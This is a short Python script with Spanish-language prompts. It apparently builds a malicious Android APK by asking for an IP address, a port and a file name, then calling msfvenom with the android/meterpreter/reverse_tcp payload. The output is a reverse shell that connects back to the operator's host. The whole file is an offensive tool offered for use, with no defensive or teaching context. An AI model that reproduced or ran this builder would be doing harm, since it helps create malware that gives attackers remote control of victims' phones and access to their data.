# Desarrollado Por NesAnTime, Todos los derechos Reservados
from tqdm import tqdm
import os
import subprocess
import platform
import time

def clear():
    sistema = platform.system()
    if sistema == "Windows":
        os.system("cls")
    elif sistema == "Linux":
        subprocess.run(["clear"])
    else:
        print("Este Sistema No Posee Mas Soporte")
def reverse(seg):
    time.sleep(seg)
def Barra(desc):
    lista_de_elementos = range(100)
    for elemento in tqdm(lista_de_elementos, desc):
        time.sleep(0.1)
#-----------------------------------------------------------------------------

clear()
print("A Continuacion, Se Completara La Creacion De La Apk (reverb shell)\n")

direccionIP = input("Ingrese Su Direccion IP: ")
opc = input(f"\nLa Direccion IP {direccionIP}, Ingresada ¿Es Correcta? (y/n): ")

while (opc == "n"):
    direccionIP = input("Ingrese Nuevamente Su Direccion IP: ")
    opc = input(f"\nLa Direccion IP {direccionIP}, Ingresada ¿Es Correcta? (y/n): ")

print(f"Se Ha Establecido Tu Direccion IP ({direccionIP}), ¡Correctamente!")
reverse(seg=2)

clear()
port = int(input("Proporcione un Puerto de Escucha: "))
print(f"El Puerto de Escucha (" + str(port) + ") Se ha Establecido Correctamente..\n")
reverse(seg=2)

clear()
print("**** Terminando La Creacion del APK ;) **** ")
name = input("\nIngrese un Nombre para el archivo: ")
reverse(seg=1)
print(f"Se Ha establecido El Nombre del Archivo ¡Correctamente! ")
reverse(seg=1)
clear()
Barra(desc="Creando Archivo .Apk")

try:
    comando = "msfvenom -p android/meterpreter/reverse_tcp LHOST="+ direccionIP + " LPORT="+ str(port) + " -o " + name +".apk"
    resultado = subprocess.run(comando, shell=True, check=True, capture_output=True, text=True)
    print("\n ---------- Se Ha Creado El Archivo .APK Correctamente ---------- \n")
    print("***______ Informacion Y Detalles ______***")
    print(f"Nombre: {name}.apk")
    print(f"IP: {direccionIP}")
    print(f"PORT: {port}")
    input("\nPresione Enter Para Finalizar... ")
    
except subprocess.CalledProcessError as e:
    print(f"Error al Crear El Archivo :( {e}")
    input("\nPresione Enter Para Finalizar... ")

    